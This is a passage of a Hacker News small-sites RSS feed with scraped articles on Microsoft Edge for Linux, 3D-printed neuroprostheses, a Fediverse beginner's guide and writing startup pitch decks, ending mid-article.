<p>Starting in October 2020, Microsoft Edge on Linux will be available to download from the Dev preview channel. Once available, you will be able to go to the <a href="https://www.microsoftedgeinsider.com/?form=MO12HB&amp;OCID=MO12HB" target="_blank" rel="noopener">Microsoft Edge Insiders site</a> to download the preview channel of Microsoft Edge on Linux. Alternatively, you will be able to download the application from the native Linux package manager.</p>



<blockquote><p>Starting in October 2020, Microsoft Edge on Linux will be available for download.</p></blockquote>



<p>Once Microsoft Edge on Linux is made available, you will be able to follow the link below to download the application. The Beta, Dev, and Canary Microsoft Edge Insider Channels will be made available for Microsoft Edge on Linux; just as they are for the Windows and macOS platforms.</p>







<p>Also, just as with other platforms, Microsoft will be open to feedback on their new Microsoft Edge browser release for Linux. This builds on their goal to serve customers the best way possible.</p>
<br>
						
											
						
					
					<h3>Article Author</h3>
					<div id="author-info">
						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=128&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=256&amp;d=identicon&amp;r=g 2x" height="128" width="128" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">																						<img id="author-img-mvp" src="https://build5nines.com/wp-content/uploads/2019/08/mvp_logo_horizontal_preferred_cyan300_rgb_300ppi_163x65.png" alt="Microsoft MVP">
													</p>
						
						<p id="author-desc">Chris is the <strong>Founder of Build5Nines.com</strong> and a <strong>Microsoft MVP</strong> in Azure &amp; IoT with 20 years of experience designing and building Cloud &amp; Enterprise systems. He is also a <strong>Microsoft Certified: Azure Solutions Architect</strong>, developer, <strong>Microsoft Certified Trainer</strong> (MCT), and Cloud Advocate. He has a passion for technology and sharing what he learns with others to help enable them to learn faster and be more productive.</p>
						
					</div>
					
											
										</div> <!-- .entry-content -->
					 <!-- .et_post_meta_wrapper -->
				</article> <!-- .et_pb_post -->

						</div> <!-- #left-area -->

				 <!-- end #sidebar -->
		</div> <!-- #content-area -->
	</div> <!-- .container -->
	</div></div>]]>
            </description>
            <link>https://build5nines.com/microsoft-edge-browser-coming-to-linux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593131</guid>
            <pubDate>Fri, 25 Sep 2020 19:12:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scientists developed a technology for printing neuroprostheses on 3D bioprinter]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593123">thread link</a>) | @rbanffy
<br/>
September 25, 2020 | https://english.spbu.ru/news/3891-scientists-developed-a-technology-for-printing-customised-neuroprostheses-on-a-3d-bioprinter | <a href="https://web.archive.org/web/*/https://english.spbu.ru/news/3891-scientists-developed-a-technology-for-printing-customised-neuroprostheses-on-a-3d-bioprinter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        
        
        
        
                        <div id="main-content">
       
            <section id="main">
                             	
            	
<div itemscope="" itemtype="https://schema.org/Article">
	<meta itemprop="inLanguage" content="en-GB">
	
		
			
					
		
						<dl>

		
			<dt>
									Details							</dt>

			
			
			
			
										<dd>
				
				<time datetime="2020-09-23T19:37:21+03:00" itemprop="datePublished">
					Published: 23 September 2020				</time>
			</dd>			
		
					
			
										<dd>
					
					<meta itemprop="interactionCount" content="UserPageVisits:90">
					Hits: 90			</dd>						</dl>
	
			
			
	
		
								<div itemprop="articleBody">
		<p>Researchers from St&nbsp;Petersburg University have developed the NeuroPrint soft neuroprosthesis 3D&nbsp;printing technology. In&nbsp;the long term, this can help paralyzed people after spinal cord injury. The new development has already shown its effectiveness in&nbsp;studies on&nbsp;mammals and zebrafish. The results are published in&nbsp;<!--noindex--><a href="https://www.nature.com/articles/s41551-020-00615-7" target="_blank" rel="1">Nature Biomedical Engineering</a><!--/noindex-->.</p>
<p>According to&nbsp;the World Health Organization, more than a&nbsp;billion people, that&nbsp;is, about&nbsp;15% of&nbsp;the world‚Äôs population, have various forms of&nbsp;disability. Every year, up&nbsp;to&nbsp;half a&nbsp;million people receive spinal cord injuries, which are often accompanied by&nbsp;paralysis, and disorders of&nbsp;autonomic functions. To&nbsp;find ways to&nbsp;restore health to&nbsp;people with disabilities, researchers are developing invasive neuroprostheses that can transmit electrical signals to&nbsp;the spinal cord and brain and recover lost functions.</p>
<p>One of&nbsp;the main challenges faced by&nbsp;doctors and scientists is&nbsp;the adjustment of&nbsp;neuroprostheses to&nbsp;the surrounding nerve tissues of&nbsp;a&nbsp;person. Despite the biocompatible elastic materials, it&nbsp;is&nbsp;not always possible to&nbsp;adapt quickly the device to&nbsp;the anatomical and age characteristics of&nbsp;the patient. The solution to&nbsp;this problem has been proposed by&nbsp;a&nbsp;research team headed by&nbsp;Professor Pavel Musienko from the Institute of&nbsp;Translational Biomedicine at&nbsp;St&nbsp;Petersburg University and Professor Ivan Minev from the University of&nbsp;Sheffield (the Department of&nbsp;Automatic Control and Systems Engineering, the University of&nbsp;Sheffield). They have developed a&nbsp;new 3D&nbsp;printing technology that makes it&nbsp;possible to&nbsp;rapidly customise muscular and neural implants for monitoring and restoring of&nbsp;motor and autonomic functions.</p>
<p>This patient-specific approach is&nbsp;now possible thanks to&nbsp;NeuroPrint hybrid 3D&nbsp;printing technology. First, the printer creates the geometry of&nbsp;the future implant made of&nbsp;silicone, which also serves as&nbsp;an&nbsp;insulating material. Then microparticles of&nbsp;platinum or&nbsp;another electrically conductive element of&nbsp;the implant are applied to&nbsp;the framework. Then the surface is&nbsp;activated by&nbsp;cold plasma. Moreover, the number and configuration of&nbsp;electrodes in&nbsp;the neural implant can be&nbsp;changed, producing devices for implantation in&nbsp;the tissue of&nbsp;the spinal cord, brain or&nbsp;muscles. The average production time from project creation to&nbsp;prototyping can be&nbsp;just 24&nbsp;hours.</p>
<p>‚ÄòBy the developed technology, the process of&nbsp;creating implants can become a&nbsp;lot faster and cheaper,‚Äô said Professor Pavel Musienko, Head of&nbsp;the Laboratory of&nbsp;Neuroprosthetics at&nbsp;the Institute of&nbsp;Translational Biomedicine, St&nbsp;Petersburg University. ‚ÄòConsidering the compactness of&nbsp;the equipment and the versatility of&nbsp;the approach, it&nbsp;is&nbsp;quite likely that in&nbsp;the future it&nbsp;will be&nbsp;possible to&nbsp;produce patient-specific neural implants right in&nbsp;the hospital. This follows the principles of&nbsp;personalized medicine and will minimise the cost and delivery time as&nbsp;much as&nbsp;possible.‚Äô</p>
<p>Neuroscientists have already exploited the NeuroPrint technology to&nbsp;carry out research on&nbsp;various model objects&nbsp;‚Äî mammals and zebrafish. It&nbsp;has shown that the new neural implants have a&nbsp;high level of&nbsp;biointegration and functional stability. Also, they are as&nbsp;good as&nbsp;their counterparts when they are used to&nbsp;restore motor functions of&nbsp;the limbs and monitor the bladder activity. Additionally, the scientists have been able to&nbsp;print soft implants similar in&nbsp;shape and mechanical characteristics to&nbsp;the dura mater&nbsp;‚Äî outer connective tissue membrane of&nbsp;the brain. This is&nbsp;an&nbsp;important achievement, since many scientific experiments cannot be&nbsp;carried out due to&nbsp;too rigid neuronal implants that are not suitable for the soft structures of&nbsp;the nervous tissue. Moreover, this limits their use in&nbsp;clinical practice.</p>
<p>‚ÄòWe have tested our development in&nbsp;experiments on&nbsp;freely moving rats for chronic recording of&nbsp;the electrocortical signals of&nbsp;the cerebral cortex, that is&nbsp;a&nbsp;necessary element of&nbsp;the brain-computer interface,‚Äô said Pavel Musienko. ‚ÄòThe experiments on&nbsp;paralysed animals have shown that electrical stimulation of&nbsp;neural networks effectively restores locomotor function. Thus, the NeuroPrint technology opens up&nbsp;new opportunities both for basic research into the central nervous system and for neuroprosthetics when people suffer from various diseases and injuries.‚Äô</p>
<p>Among the participants of&nbsp;the research are scientists from: St&nbsp;Petersburg University; Pavlov Institute of&nbsp;Physiology of&nbsp;the Russian Academy of&nbsp;Sciences; Granov Russian Research Centre of&nbsp;Radiology and Surgical Technologies; St&nbsp;Petersburg State Research Institute of&nbsp;Phthisiopulmonology of&nbsp;the Ministry of&nbsp;Health of&nbsp;the Russian Federation; Ural Federal University; Technische Universit√§t Dresden (Germany); and the University of&nbsp;Sheffield (the UK).</p>
<p><strong>For reference:</strong></p>
<p>The research has been supported by&nbsp;grants from: St&nbsp;Petersburg University; European Research Council; Technische Universit√§t Dresden; the Russian Foundation for Basic Research; the German Research Foundation (the Deutsche Forschungsgemeinschaft); and Volkswagen Foundation.</p> 	</div>

	
							</div>

                                     
            </section>                 
              
        
                  
        </div>
                                
    </div></div>]]>
            </description>
            <link>https://english.spbu.ru/news/3891-scientists-developed-a-technology-for-printing-customised-neuroprostheses-on-a-3d-bioprinter</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593123</guid>
            <pubDate>Fri, 25 Sep 2020 19:11:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fraunhofer: Blockchain technology to support cooperation in asylum procedures [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593100">thread link</a>) | @jules-jules
<br/>
September 25, 2020 | https://www.fit.fraunhofer.de/content/dam/fit/de/documents/BAMF_FhG_Whitepaper_en_final.pdf | <a href="https://web.archive.org/web/*/https://www.fit.fraunhofer.de/content/dam/fit/de/documents/BAMF_FhG_Whitepaper_en_final.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.fit.fraunhofer.de/content/dam/fit/de/documents/BAMF_FhG_Whitepaper_en_final.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593100</guid>
            <pubDate>Fri, 25 Sep 2020 19:08:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Guide to the Fediverse]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593001">thread link</a>) | @yogthos
<br/>
September 25, 2020 | https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse | <a href="https://web.archive.org/web/*/https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>

<header id="Title">
  
  
  <time>2020-07-19</time>
</header>

<nav id="TOC" role="doc-toc">
  <ul>
  <li><a href="#explanation">Explanation</a></li>
  <li><a href="#overview-of-the-fediverse">Overview of the Fediverse</a></li>
  <li><a href="#getting-started">Getting started</a></li>
  <li><a href="#comparison-with-traditional-social-media">Comparison with traditional social media</a>
  <ul>
  <li><a href="#moderation">Moderation</a></li>
  <li><a href="#privacy-and-trust">Privacy and trust</a></li>
  <li><a href="#manipulation-and-fake-news">Manipulation and fake news</a></li>
  <li><a href="#discoverability">Discoverability</a></li>
  <li><a href="#size-and-growth">Size and growth</a></li>
  </ul></li>
  <li><a href="#what-can-you-do">What can you do?</a></li>
  <li><a href="#further-reading">Further reading</a></li>
  </ul>
</nav>

<p><small> See also: <a href="https://torresjrjr.com/archive/2020-07-20-what-is-the-fediverse"><em>quick short version</em></a> </small></p>
<p>What is the <strong>Fediverse</strong>, or <strong>federated social media</strong>? This is a condensed, simplified, plain English guide to understanding the Fediverse, why it‚Äôs awesome, and how to join. You can read the whole article, or skip to <em><a href="#getting-started">Getting started</a></em>.</p>
<figure>
<img src="https://upload.wikimedia.org/wikipedia/commons/9/93/Fediverse_logo_proposal.svg" height="128" alt="Unofficial Fediverse logo ‚Äì Wikipedia">
</figure>
<h2 id="explanation">Explanation</h2>
<p>The Fediverse (federated + universe) is essentially a decentralised social media network of independent &amp; interconnected servers. <em>Federated social media</em>? This definition will make sense once we clear up some concepts.</p>
<p>The best analogy is email. Consider this: Alice makes an email account on the email service provider <code>gmail.com</code>, which is <code>alice@gmail.com</code>. Her friend Bob makes an email account on <code>gmail.com</code> too, which is <code>bob@gmail.com</code>. Alice and Bob can send emails to each other, no problem. Their friend Charlie also makes an email account, but on another email service provider <code>yahoo.com</code>, which is <code>charlie@yahoo.com</code>.</p>
<p>Even though Charlie <code>charlie@yahoo.com</code> uses a different server, he can still communicate via email seamlessly with Alice <code>alice@gmail.com</code>. This is because the two email servers use an underlying ‚Äúemail protocol‚Äù to send and receive email. To Alice, it makes no difference whether she‚Äôs emailing Bob or Charlie. Why aren‚Äôt social media services like that?</p>
<p>Contrast that to Twitter, for example. There‚Äôs one ‚Äútweet service provider‚Äù <code>twitter.com</code>, and you can make accounts only on <code>twitter.com</code> (<code>@alice</code>, <code>@bob</code>, <code>@charlie</code>). While convenient, what if you don‚Äôt like how Twitter is handling things? What if they abuse their power and one day arbitrarily delete all of your tweets and account? What if <a href="https://www.theverge.com/2020/7/15/21326200/elon-musk-bill-gates-twitter-hack-bitcoin-scam-compromised">Twitter is hacked</a> and leaves everyone vulnerable? You can‚Äôt sign up to some other ‚Äútweet service provider‚Äù.</p>
<figure>
<img src="https://i.imgur.com/93qydOh.png" alt="A centralised vs.&nbsp;decentralised network.">
</figure>
<p>Twitter is <strong>centralised</strong>, whilst email is <strong>decentralised</strong>. The Fediverse is like a ‚Äúdecentralised Twitter‚Äù. There exists hundreds of various Fediverse <strong>instances</strong> (imagine <code>tweet.com</code>, <code>toot.net</code>, <code>social.org</code>), all of which act as independent Twitters (which we‚Äôll see shortly). Users on these instances can tweet/post to any other user on any instance, and do all the usual things like following, liking, and resharing posts. Imagine Alice tweeting from her account on one instance <code>@alice@toot.net</code> to Charlie‚Äôs account on another instance <code>@charlie@social.org</code>. This is the power of the Fediverse.</p>
<figure>
<img src="https://i.imgur.com/zdG7B0k.png" alt="A post and reply on Mastodon, a Fediverse instance. Notice the handles in red.">
</figure>
<p>What‚Äôs more, the Fediverse is not limited to short ‚Äútweet/note‚Äù posts, but other forms of media and ‚Äúactivities‚Äù posts too. Consider YouTube, basically a centralised social media for video posts and comment posts. Imagine if your Twitter account could ‚Äúfollow/subscribe‚Äù a YouTube channel, and ‚Äúlike‚Äù and ‚Äúreply/comment‚Äù to their video posts. This experience <a href="https://framatube.org/videos/watch/da2b08d4-a242-4170-b32a-4ec8cbdca701">actually exists</a> in the Fediverse!</p>

<p>In the same way email servers use the ‚Äúemail protocol‚Äù (SMTP) to share emails, Fediverse instances use the <strong>ActivityPub</strong> protocol to share activities (creating and liking posts, commenting on videos, resharing images, etc.). There are other protocols, but ActivityPub is the most used. To <em>federate</em> means for two instances to interconnect. Hence, the <strong>Fediverse</strong> is the entire network of federated instances. And it‚Äôs pretty big.</p>
<h2 id="overview-of-the-fediverse">Overview of the Fediverse</h2>
<p>By now you understand that the Fediverse isn‚Äôt some company or product or service, but a network of <em>independently hosted</em> services. Here are a list of popular federated services that people host on their own websites:</p>
<ul>
<li><a href="https://joinmastodon.org/">Mastodon</a> - Microblogging. The most popular service and Twitter alt.</li>
<li><a href="https://pleroma.com/">Pleroma</a> - Microblogging. A more lightweight, customisable Twitter alt.</li>
<li><a href="https://joinpeertube.org/">PeerTube</a> - Video streaming. YouTube alt.</li>
<li><a href="https://joinplu.me/">Plume</a> - Federated blogging.</li>
<li><a href="https://write.as/">Write.as</a> - Federated blogging.</li>
<li><a href="https://dev.lemmy.ml/">Lemmy</a> - Link aggregator. Reddit alt.</li>
<li><a href="https://beta.joinpixelfed.org/">Pixelfed</a> - Photo sharing. Instagram alt.</li>
<li><a href="https://friendi.ca/">Friendica</a> - Microblogging+. Facebook alt.</li>
<li><a href="https://funkwhale.audio/">Funkwhale</a> - Audio streaming. Spotify alt.</li>
<li>And many more. See <a href="https://fediverse.party/">Fediverse.party</a> or the <a href="https://en.wikipedia.org/wiki/Fediverse#Fediverse_software_platforms">Wikipedia list</a>.</li>
</ul>
<p>There are <a href="https://fediverse.space/">thousands of instances</a> running these services, hosted by everyday people!</p>
<blockquote>
<p>What else can I say? I think that fact that a fast Pleroma instance can be hosted on a $3 server speaks for itself<br>
‚Äì <a href="https://medium.com/we-distribute/blushy-crushy-fediverse-idol-a-chat-with-lain-about-pleroma-4ff578b99752#5444"><em>Lain</em></a>, creator of <a href="https://pleroma.com/">Pleroma</a>.</p>
</blockquote>
<p>Incredibly, all of these services are interconnected and work pretty much seamlessly. Users can interact with others users and content across the entire network. They are truly free to roam, unlike the walled gardens of Twitter, Facebook, and YouTube.</p>
<figure>
<img src="https://i.imgur.com/MDoyecc.png" alt="Mastodon, Pleroma, and PeerTube on mobile. All interconnected.">
</figure>
<p>Instances provide common activities such as liking, following, boosting/forwarding/resharing, commenting/replying, attachments, and polls, as well as extra features such as <em>content warnings</em>, <em>local &amp; global timelines</em>, custom emoji, and more. #Hashtags and <span data-cites="mentions">@mentions</span> are also supported.</p>
<p>Servers aren‚Äôt the whole story. While you can always access your Fediverse account in your web browser, <a href="https://joinmastodon.org/apps">various mobile and desktop apps</a> exist as Fediverse clients, so users can post and browse from wherever they please. Since these apps all talk the same ActivityPub protocol, they can be used to log into any pretty much any Fediverse server, with minor differences.</p>
<p>Because of the decentralised nature, instances feel like small towns (or big cities), and you‚Äôre free to travel the universe anytime. This homely feel allows for the flourishing of communities, while avoiding feeling like your voice is anchored to one place.</p>
<p>Some instances are international and generic like <a href="https://mas.to/public">mastodon.xyz</a>. Some are focused around a region or language, like Swedish <a href="https://fikaverse.club/public">fikaverse.club</a>, or Japanese <a href="https://mstdn.jp/public">mstdn.jp</a>. Some are topic based, like Free software <a href="https://floss.social/public">floss.social</a>, fan culture, gaming, art, activism, lgbt+, cat pics, etc. Some are big and bustling, while others are small and cozy. There‚Äôs probably one suited to you. If choosing an instance is overwhelming, start out with a generic one. They‚Äôre all interconnected after all, so there‚Äôs no huge commitment.</p>
<h2 id="getting-started">Getting started</h2>
<p>Want a glimpse of the Fediverse? Don‚Äôt know where to start? You can‚Äôt go wrong with a creating an account on a <a href="https://joinmastodon.org/">Mastodon</a> instance. It‚Äôs the most popular and de facto service. If you‚Äôre feeling adventurous, <a href="https://fediverse.network/">Fediverse.network</a> has a list of other known Fediverse instances. I recommend signing up to an instance running either Mastodon or Pleroma, since those will be familiar, Twitter-like microblogging instances.</p>
<figure>
<img src="https://i.imgur.com/EIlnJXc.png" alt="Pick a Mastodon instance and browse the Fediverse.">
</figure>
<p>Once you‚Äôve created an account, you may want to access your feed on your mobile. If so, I recommend the <a href="https://huskyapp.dev/"><em>Husky</em></a> app for Android, or the <a href="https://apps.apple.com/us/app/toot/id1220921451"><em>Toot!</em></a> app for iOS. Simply choose your instance when prompted, then sign into your account.</p>
<p>Time to explore! Most instances split feeds into three categories or timelines:</p>
<ul>
<li>Home - Posts from users you follow.</li>
<li>Local, public - All public posts from users on the instance.</li>
<li>Federated, global - All public posts, from all users, from anywhere the instance has ever come across.</li>
</ul>
<p>When starting out, checking out the local or global timeline is a good place to find users to follow. Be sure to say hi too, since even without any followers, others will see you pop up on their local timeline. Fediverse users are always friendly and welcoming to newcomers on their instance.</p>

<h3 id="moderation">Moderation</h3>
<p>There are other benefits to a federated social network. Big centralised networks tend to suffer from a lack of moderation and supervision. Spam, trolls, bots, malicious agents, and vulgar content can overwhelm such a network, and leave an admin paralysed by decision, trying to please everyone.</p>
<p>The Fediverse generally handles spam much more gracefully and is more resilient by nature. Instance admins can react more quickly to spam. They can set what ever moderation policies they like, and choose which other instances to <em>not</em> federate with (essentially block) if they don‚Äôt find their content appropriate. This gives users more of a choice as to where they feel most comfortable. Everybody wins.</p>
<h3 id="privacy-and-trust">Privacy and trust</h3>
<p>Of course, big centralised networks are heavily criticised for abusing users‚Äô trust and na√Øvety, collecting and selling private data (searches, images, friends, location) without consent from family and children, and calculating their behaviour patterns, sexual orientation, and vulnerable biases and insecurities to target with ads. The incentive to monetize your private data is so strong, companies will do anything, pass the threshold of creepy.</p>
<p>Most Fediverse servers run on <strong>Free and Open Source</strong> software, meaning that anyone‚Äôs nerdy friend can glance at the code and verify that no such nefarious data-harvesting business is going on. It‚Äôs very rare to see ads on the Fediverse, since running a server often isn‚Äôt too expensive to do. Hosters even tend to crowdfund (successfully so) instead of selling your data. As such, people feel much more comfortable and open on the Fediverse.</p>
<h3 id="manipulation-and-fake-news">Manipulation and fake news</h3>
<p>Arbitrary banning, harmful <a href="https://en.wikipedia.org/wiki/shadowban">shadowbanning</a>, and of course targeted ads, all create a web of distrust and disorientation. It‚Äôs well known that big corporations and governments use their money and influence to obfuscate narratives for their own benefit, at the expense of users. This even happens internally within the big tech giants.</p>
<p>Posts and conversations on the Fediverse are guaranteed to spread and grow organically, free from manipulation, since no instance governs, controls, or is dependent on another. It‚Äôs also much harder for a ‚Äúforeign power‚Äù to successfully abuse every instance of the entire network and target people with fake news. The Fediverse culture is therefore much more critical and fruitful.</p>
<h3 id="discoverability">Discoverability</h3>
<p>One thing centralised networks have an advantage over the Fediverse is that they can provide easy search for users, since they have all the data in one place. Fediverse users can capably search over their local instance, but need more patience when searching over the entire network. A side effect is a weaker set of ‚Äúoverview‚Äù features like ‚Äútrending‚Äù or ‚Äúhashtags‚Äù.</p>
<p>Some, however, like it that way. On big central networks, you never know ‚Ä¶</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse">https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse</a></em></p>]]>
            </description>
            <link>https://torresjrjr.com/archive/2020-07-19-guide-to-the-fediverse</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593001</guid>
            <pubDate>Fri, 25 Sep 2020 18:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating a Pitch Deck for Your New Tech?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592912">thread link</a>) | @nickfrost
<br/>
September 25, 2020 | https://bryllyant.com/blog/creating-a-pitch-deck-for-your-new-tech/ | <a href="https://web.archive.org/web/*/https://bryllyant.com/blog/creating-a-pitch-deck-for-your-new-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>What is a pitch deck?</h2>
<p>Basically, think of your pitch deck as your startup‚Äôs resume and interview prep all in one.</p>
<p>A pitch deck is a brief presentation that informs potential investors, partners, customers, and the public/media about your product. It should be short enough to keep their attention, but long enough to give them a clear understanding of your product, vision, and goals for your company. </p>
<p>You will notice that we said that your presentation should be brief. You are the expert about your tech and, of course, excited to share all the details with anyone who will listen. You and your team have spent long hours and invested tons of sweat equity, getting it to where it is today. Save the lengthy explanations for your friends and family. Your pitch should be as short and concise as possible, without omitting any important information, this will ensure that people stay fully engaged.</p>
<p>What does brief mean? Your pitch deck should contain about 18-20 slides, each one containing one big idea. Focus on keeping a balance between the number of slides and presenting a clean, clear message.</p>
<p>So, all a founder has to do is create one slide deck that details the product, and they are good to go? </p>
<p>Not really, just like career consultants advise job seekers to tailor their resumes and cover letters to the job they are seeking, you should also customize your pitch deck to different targets. </p>
<h2>1. Realize That One Size Does Not Fit All</h2>
<p>Each audience will be looking for specific details about your firm, and having customized presentations speaks volumes about your organization‚Äôs proactive nature and level of professionalism.</p>
<p>How many presentations should you prepare? That really depends on your product, your funding stage, and your application. But, at any time, you should have at least three slide decks ready that address the questions, concerns, and issues that the below audiences may have.</p>
<ul>
<li>Investor/VC‚Äôs</li>
<li>Partner‚Äôs /Customer</li>
<li>General Public/Media</li>
</ul>
<p>Before you get nervous, know that you will not need to recreate the wheel for each pitch deck, but you certainly should customize the content and its complexity.</p>
<h2>2. Know Your Audience</h2>
<p><em>Investors/VC‚Äôs</em></p>
<p>For your startup, the pitch deck will likely be your most vital fundraising tool, whether you‚Äôre looking to raise $50,000, $500,000, or $50 million. In the same way that human resource managers see endless resumes each day and candidates have only a few moments to catch their eye, funders see scores of pitch decks each week, and according to <a href="https://www.docsend.com/index/2020-docsend-startup-index/#:~:text=The%20main%20trend%20that%20founders,in%20your%20send%20ahead%20deck." target="_blank" rel="nofollow noopener noreferrer">DocSend</a>, VCs spend only about 3:23 minutes on a successful pitch deck.</p>
<p>What do you need to do to ensure that your presentation has what it takes to wow them? Follow in the footsteps of those who have done it before and have been successful. Peter Thiel, co-founder of PayPal, Palantir, president of Clarium Capital Management, and early angel investor in Facebook certainly knows his way around the venture capital world. He suggested that VC/fundraising presentations be clear, simple, compelling, easy to act on, and include the following components.</p>
<ul>
<li>Problem</li>
<li>Solution</li>
<li>Market Size</li>
<li>Product</li>
<li>Team</li>
<li>Traction</li>
<li>Competition</li>
<li>Financials</li>
<li>Amount being raised</li>
</ul>
<p>And while there is no doubt that Peter has been highly successful, both as a founder and as an investor, we might suggest a slight tweak to his list to include the following.</p>
<ul>
<li>Cover slide</li>
<li>Problem/Need Gap</li>
<li>
<p>Solution</p>
<ul>
<li>Product</li>
<li>Why you/Why now</li>
</ul>
</li>
<li>
<p>The Business‚Ää</p>
<ul>
<li>Market size</li>
<li>Competitive landscape</li>
<li>Trends</li>
<li>Financials</li>
<li>Business model</li>
<li>Amount being raised</li>
<li>Team</li>
<li>Traction</li>
</ul>
</li>
<li>
<p>Next steps </p>
<ul>
<li>Roadmap - Go to Market</li>
<li>Future directions</li>
<li>The Ask</li>
</ul>
</li>
</ul>
<h2>3. Tell The Story</h2>
<p><strong>Investor Deck</strong></p>
<p><em>Cover Slide</em></p>
<p>You may ask, since investors are going to spend less than four minutes reviewing my pitch deck shouldn't I skip a cover slide and get right to the point? Your pitch deck is doing more than conveying facts and figures; it is telling a story.</p>
<p>Think of going to the movie theater and watching the trailers. You get excited by that short snippet of storytelling and will look forward to seeing that movie. Your cover slide is the trailer for your presentation. It builds expectations about what you, your tech, and your startup are about. Your cover slide should, of course, include your logo and contact information, but more importantly, it should focus on what is at the heart of your solution. You need to demonstrate not just the value of your tech, but also your creativity and pride in what you are building. This is where you showcase your cause, your brand, and where you can build a connection with your audience. You help to build that connection by including both a tagline (think of Nike‚Äôs Just Do It) and an impactful image that brings to mind what you seek to achieve. Are you creating a cooking application that integrates recipes, pictures, and instructions with streaming video so that people can work on the same recipe across the miles? Use an image that evokes all of the feelings of cooking at home with a loved one.</p>
<p><em>Problem/Need Gap</em></p>
<p>Once you have your audience drawn into your story, you can then share the ONE painful problem with which many people can relate and that you know the investors will understand. Note that we said one, not two, or three problems. </p>
<p>You do not want to overwhelm investors, and you want to show them how focused you are on achieving your mission.</p>
<p><em>Solution</em></p>
<p>You must be able to communicate as simply as possible a description of your tech and how it works ‚Äì no deep dives here. It is also vital to share the benefits to the user(s) and to have available a great short product demo.</p>
<p>Investors will want to understand why your solution is the right one as there undoubtedly other companies tackling the same challenge with different approaches. You will also need to articulate why now is the right time for your tech. <a href="https://bryllyant.com/blog/why-your-startup-needs-a-tech-co-founder-or-chief-technology-officer/" target="_blank" rel="nofollow noopener noreferrer">Timing</a> is critical to startups facing a rapidly changing marketplace and competition racing to get to launch first.</p>
<p><em>The Business</em></p>
<p>This is the part of the pitch that potential investors are here for; how will your unique product make you and them money? They may believe in your solution, and they may even like you, but they are investors after all, and they are looking for their return. You need to clearly explain how large you believe your company can be (market size and competitive landscape ‚Äì <a href="https://www.inc.com/jeff-haden/bottom-up-or-top-down-market-analysis-which-should-you-use.html" target="_blank" rel="nofollow noopener noreferrer">utilize top-down or bottom-up analysis</a>), where it is going (trends), what are you going to spend to get you there (financials), how you are going to get there (business model), how much funding do you need to get you there (amount being raised), who will get you there (team), and what you have already accomplished (traction.)</p>
<p><strong>Next steps</strong></p>
<p><em>Roadmap - Go to Market</em></p>
<p>This slide will make it simple for a VC to envision how you will grow your audience or scale. Especially as an early-stage startup, you have no way of knowing if any of your ideas will be successful, but that is the nature of all new businesses. As you move through stages of funding and implement different strategies, you can update the slide with your wins and refined tactics.</p>
<p>Airbnb pitched a 'dual posting feature' to investors in which host properties would be listed on Kayak.com. That partnership never came to fruition, but they developed a bot function that reposted any Airbnb listing on Craigslist and linked back to Airbnb, increasing traffic.</p>
<p><em>Future Directions</em></p>
<p>Remember when we said to focus on only one problem and one solution? Well, this is your chance to share your long-term vision for what your tech can be in five or ten years. Start like Jeff Bezos, pitch your online bookstore, but share your vision for the everything store for everyone. This slide can also share opportunities for new markets, partnerships, or collaborations.</p>
<p><em>The Ask</em></p>
<p>The answer is always no if you never ask the question. This slide should be tailored to the specific funder/investor, their capacity, and their engagement. Be sure to align the size of your ask with funding that they have provided to startups like your own. This means doing your research before the pitch meeting. Over or under-asking can start a relationship off on the wrong foot.</p>
<p><strong>Partner/Customer Deck</strong></p>
<p>Since you will want to engage partners and customers at a similar level as investors, but they will have less, well, invested, their deck does not need to be quite as detailed.</p>
<p>They will still be interested in the following:</p>
<ul>
<li>Cover slide</li>
<li>
<p>Problem/Need Gap ‚Äì from THEIR perspective</p>
<ul>
<li>Solution - Product</li>
</ul>
</li>
<li>
<p>The Business‚Ää</p>
<ul>
<li>Success stories</li>
<li>Competitive advantage</li>
<li>Trends</li>
</ul>
</li>
<li>
<p>Next steps </p>
<ul>
<li>How can they buy from you or work with you</li>
</ul>
</li>
</ul>
<p><strong>General Public/Media Deck</strong></p>
<p>This is sometimes called a ‚Äúsend out‚Äù deck and helps garner interest in your product. Your goal should always be to only pitch in person, but a send-out deck can be especially useful with the media. The content shared here should be pared down significantly and can often be accomplished with a one page PDF. It should include:</p>
<ul>
<li>Problem</li>
<li>Solution</li>
<li>Traction</li>
<li>Market details ‚Äì brief</li>
<li>Competition ‚Äì why you are better</li>
<li>Team</li>
<li>How to contact/learn more</li>
</ul>
<h2>4. Make It Flawless</h2>
<p><em>Design</em></p>
<p>Once you have the content you need for your pitch, it is time to make it look amazing. There are a plethora of presentation software tools available; just a few to consider are:</p>
<ul>
<li>Canva</li>
<li>Prezi</li>
<li>DocSend</li>
